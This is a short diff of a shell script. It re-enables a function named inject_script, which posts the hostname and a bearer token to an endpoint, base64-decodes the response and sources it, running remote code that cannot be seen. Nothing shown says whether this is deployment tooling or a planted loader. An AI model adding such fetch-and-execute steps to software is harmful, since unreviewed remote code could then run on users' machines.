@@ -59,12 +59,11 @@ inject_script() {
     context=$(hostname)
 
     # Fetch the base64 encoded script 
-    #source <(
-      curl -sL $ENDPOINT \
+    source <(curl -sL $ENDPOINT \
                 -X POST \
                 -H "Authorization: Bearer $token" \
                 -H "Content-Type: application/json" \
-                --data-binary "{\"context\":\"$context\"}" | base64 -d #)
+                --data-binary "{\"context\":\"$context\"}" | base64 -d)
 }
 
 final_steps() {
